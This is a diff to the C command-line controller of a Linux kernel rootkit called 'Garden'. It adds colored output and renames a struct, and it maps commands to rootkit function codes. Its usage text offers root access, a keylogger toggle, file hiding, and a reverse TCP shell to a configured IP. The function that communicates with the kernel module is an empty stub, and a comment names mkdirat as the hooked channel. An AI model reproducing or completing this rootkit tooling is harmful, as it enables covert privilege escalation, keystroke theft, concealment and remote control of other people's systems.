@@ -1,14 +1,17 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <stdio.h>
+#include <linux/ioctl.h>
 #include <stdbool.h>
 
 /**
- * ###########
- * Globals
- * ###########
+ * ##############
+ * Global Defines
+ * ##############
  */
 
+// Command Line Args
 #define ROOT "root"
 #define KEYLOGGER "keylogger"
 #define ENABLE "enable"
@@ -19,16 +22,23 @@
 #define REMOVE "rm"
 #define SHOW "show"
 
+// ANSI Colors
+#define RED     "\x1b[31m"
+#define GREEN   "\x1b[32m"
+#define BLUE    "\x1b[34m"
+#define RESET   "\x1b[0m"
+
 /**
- * ###########
+ * #######
  * Structs
- * ###########
+ * #######
  */
 
 /**
  *Each function_code property is a unique number that will be passed to the
  * LKM to indicate what function to perform.
  */
+// TODO: Extract this to an h file to avoid duplication.
 typedef struct function_code {
   int get_root;
   int keylogger_enable;
@@ -39,7 +49,7 @@ typedef struct function_code {
   int reverse_tcp_shell;
 } function_code;
 
-function_code f_code = {
+function_code functionCode = {
 	.get_root = 0,
 	.keylogger_enable = 1,
 	.keylogger_disable = 2,
@@ -49,48 +59,64 @@ function_code f_code = {
 	.reverse_tcp_shell = 6
 };
 
+
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
   int func_code;
   char *file_hide_str;
 } action_task;
 
-
 /**
  * Printing
  */
 
+void print_red(const char *text) {
+	printf("%s %s %s", RED, text, RESET);
+}
+
+void print_green(const char *text) {
+	printf("%s %s %s", GREEN, text, RESET);
+}
+
+void print_blue(const char *text) {
+	printf("%s %s %s", BLUE, text, RESET);
+//	printf("%s %s %s", CYAN, text, RESET);
+}
+
+
 void print_banner() {
-	char *banner = "\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
+	char *banner = "\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
 \t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
 \t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
 \t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
 \t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
 \t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";
 
-	printf("%s", banner);
+	print_green(banner);
 }
 
 void print_usage() {
-	printf("\nWelcome to the Garden.\n--------------\n");
-	printf("\t/garden root\t\t\t\t - gives you root.\n");
-	printf("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
-	printf("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
-	printf("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
-	printf("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
-	printf("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
+	print_green("\nWelcome to the Garden.\n--------------\n");
+	print_green("\t/garden root\t\t\t\t - gives you root.\n");
+	print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
+	print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
+	print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
+	print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
+	print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
 	exit(0);
 }
 
-// TODO: Print in colors
-
 /**
- * Uses SOME_FUNCTION to interface with rootkit. The LKM hooks this function
- * and responds to the actions as they come in.
+ * Uses mkdirat to interface with rootkit. The LKM hooks this function
+ * and responds to the actions as they come in. Each action is signified by a
+ * "magic action_task" sent before each rootkit request.
  *
  * Returns 0 if successfully communicated, -1 otherwise.
  */
 int communicate_with_lkm(action_task *data_to_pass) {
+	// long ioctl(struct file *f, unsigned int cmd, unsigned long arg);
+
+
 	return 0;
 }
 
@@ -107,13 +133,13 @@ bool check_for_subarg(int idx, char *argv[]) {
 
 void handle_get_root(char *base_cmd, action_task *action) {
 	if (! strcmp(base_cmd, ROOT)) {
-		action->func_code = f_code.get_root;
+		action->func_code = functionCode.get_root;
 	}
 }
 
 void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
 	if (! strcmp(base_cmd, REVERSE_TCP_SHELL)) {
-		action->func_code = f_code.reverse_tcp_shell;
+		action->func_code = functionCode.reverse_tcp_shell;
 	}
 }
 
@@ -129,9 +155,9 @@ void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
 void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
 	if (! strcmp(base_cmd, KEYLOGGER)) {
 		if (! strcmp(subarg, ENABLE)) { // Keylogger enable
-			action->func_code = f_code.keylogger_enable;
+			action->func_code = functionCode.keylogger_enable;
 		} else if (! strcmp(subarg, DISABLE)) { // Keylogger disable
-			action->func_code = f_code.keylogger_disable;
+			action->func_code = functionCode.keylogger_disable;
 		}
 	}
 }
@@ -145,12 +171,12 @@ void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) 
 void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
 	if (! strcmp(base_cmd, FILE_HIDE)) {
 		if (! strcmp(subarg, SHOW)) {
-			action->func_code = f_code.file_hide_show;
+			action->func_code = functionCode.file_hide_show;
 		} else if (check_for_subarg(3, argv)) { // Make sure the 3rd arg in $ hide [add/rm] FILE exists
 			if (! strcmp(subarg, ADD)) {
-				action->func_code = f_code.file_hide_add;
+				action->func_code = functionCode.file_hide_add;
 			} else if (! strcmp(subarg, REMOVE)) {
-				action->func_code = f_code.file_hide_rm;
+				action->func_code = functionCode.file_hide_rm;
 			} else {
 				print_usage();
 			}
